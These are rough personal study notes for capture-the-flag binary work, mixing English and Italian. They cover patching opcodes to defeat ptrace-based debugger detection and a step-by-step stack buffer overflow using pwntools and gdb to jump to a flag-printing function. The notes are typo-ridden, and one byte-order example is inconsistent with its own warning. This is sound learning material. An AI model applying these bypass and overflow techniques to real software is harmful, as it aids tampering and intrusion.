[xor eax, eax & nop & nop]  == 31 c0 90 90
or
[xor eax, eax & nop]  == 31 c0 90 

xor eax, eax is a faster way of setting eax to zero. This is happening because you're returning zero.
It executes faster than a MOV EAX,$0 and doesn't need to fetch immediate data of 0 to load into eax



La seconda 41 0f 44 c5 diventa 0f 44 c0 90 (cmove  %r13d,%eax diventa [move %eax,%eax & nop]) si trova sempre dentro detect_1
?????


[mov 0x0, eax] == b8 00 00 00 00
[mov 0x0, edx] == ba 00 00 00 00



-----------------------------------------------------------------------------------------

Ptrace

The ptrace system call allows one process to trace another. My guess is that your application (that is trying to detect the debugger) spawns a child process (or maybe thread) and then uses ptrace to attach to this child, just like a debugger would.

The catch is that only one process can trace another, if a second process tries to attach with ptrace then the second ptrace will fail, returning -1 and setting errno to EPERM. If you are running under a debugger then the debugger will have got in first and attached with ptrace, so when the application itself tries to attach with ptrace this call will fail.

Now if the code in the application you are debugging is not very good, and it only checks to see if ptrace returns success or not, then forcing the value of eax to be 0 (where 0 indicates success for ptrace) might be enough to fool the application into thinking that it is not running under a debugger.

Obviously, it would be possible to write more complex code in the application that makes more extensive use of ptrace such that it would be harder (though not impossible) to work around this detection


-----------------------------------------------------------------------------------------


mov     dword ptr [esp], offset aCatFlagTxt ; "cat flag.txt"
call    _system
leave

==


void print_flag(){
	sysytem("cat flag.txt");
}




BufefrOverflow

I. use wim payload.py
	"write python Code"
	...
	p = p.process('./elfFile')
	p.sendline(messageInInput)
	output = p.recvall()  //To save the output
	//or
	p.interactive()  //To open a bash 

	:wq     //write(save) & quit 


After that, lunch it ==> python3 payload.py

II. use vim payload.py (Define needed buffer Lenght)
	"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL..."
	:wq //save quit
	
Bash: do python payload.py > exploit

And then run it on a different bash in gdb

gdb ./elfFile

(gdb)disass "fucntionName"
(gdb)break *0xTargetAddress

(gdb)r < /path/to/exploit  (redirect file to input program)

(gdb)info registers
	
eax  0x51515151

to find what chr is:
	open python
	>>> chr(0x48)
	'H'


So now we know how much padding we need

Open vim payload.py

Delet the extra padding
padding= "AAAABBBBCCCCDDDDEEEEFFFFGGGG"
target = "\x08\x04\x84\x24"   #  0x8048424
msgIN = padding

Watchout for BigEndian vs LittleEndian

(gdb) c


Succesfully Injected (jumped at 0x8048424)

